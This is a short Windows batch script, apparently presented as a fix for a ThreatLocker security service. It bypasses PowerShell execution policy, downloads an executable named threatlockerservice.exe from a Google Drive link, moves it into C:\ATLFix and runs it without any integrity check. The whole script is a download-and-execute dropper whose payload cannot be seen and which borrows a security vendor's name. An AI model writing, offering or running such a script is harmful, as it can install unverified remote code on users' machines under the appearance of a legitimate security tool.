@echo off
setlocal

REM ### Configuration ###
set "FolderName=C:\ATLFix"
set "FileName=threatlockerservice.exe"
set "FileID=1Kqe05P9UnaExgg_yuSC5Dc0yWcbpH9dP"

REM --- 1. Download the File using PowerShell ---
echo Downloading %FileName%... This may take a moment.

powershell -NoProfile -ExecutionPolicy Bypass -Command "& { $url = 'https://drive.google.com/uc?export=download&id=%FileID%'; $output = '%FileName%'; $web = New-Object System.Net.WebClient; $web.DownloadFile($url, $output) }"

REM Check if the download was successful (basic check for file existence and size > 0)
if not exist "%FileName%" (
    echo.
    echo ERROR: File download failed. The file was not created.
    echo Please check the FileID and your internet connection.
    pause
    exit /b
)
for %%A in ("%FileName%") do if %%~zA LSS 100000 (
    echo.
    echo ERROR: The downloaded file is too small and likely the warning page.
    echo Please ensure the file sharing is set to 'Anyone with the link'.
    del "%FileName%"
    pause
    exit /b
)

echo Download complete.

REM --- 2. Create Folder ---
echo Creating folder...
if not exist "%FolderName%" (
    mkdir "%FolderName%"
    echo Folder %FolderName% created.
) else (
    echo Folder %FolderName% already exists.
)

REM --- 3. Place File in Folder ---
echo Moving file...
if exist "%FileName%" (
    move "%FileName%" "%FolderName%"
    echo %FileName% moved to %FolderName%.
) else (
    echo Error: %FileName% not found in the current directory after download.
    pause
    exit /b
)

REM --- 4. Run the Executable ---
echo Running the service...
if exist "%FolderName%\%FileName%" (
    start "" "%FolderName%\%FileName%"
    echo %FileName% has been executed.
) else (
    echo Error: %FileName% not found in %FolderName%.
    pause
    exit /b
)

endlocal
echo.
echo Script finished.
pause